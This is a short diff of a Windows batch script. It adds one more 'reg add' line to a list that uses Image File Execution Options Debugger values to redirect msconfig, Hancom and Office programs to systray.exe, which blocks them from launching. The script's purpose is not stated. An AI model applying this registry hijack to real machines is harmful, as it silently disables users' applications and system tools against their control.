@@ -177,6 +177,7 @@ reg add "%IFEO%\msconfig.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\hwp.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\HncTT.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\ODTEditor.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
+reg add "%IFEO%\Hword.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\excel.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\winword.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\powerpnt.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
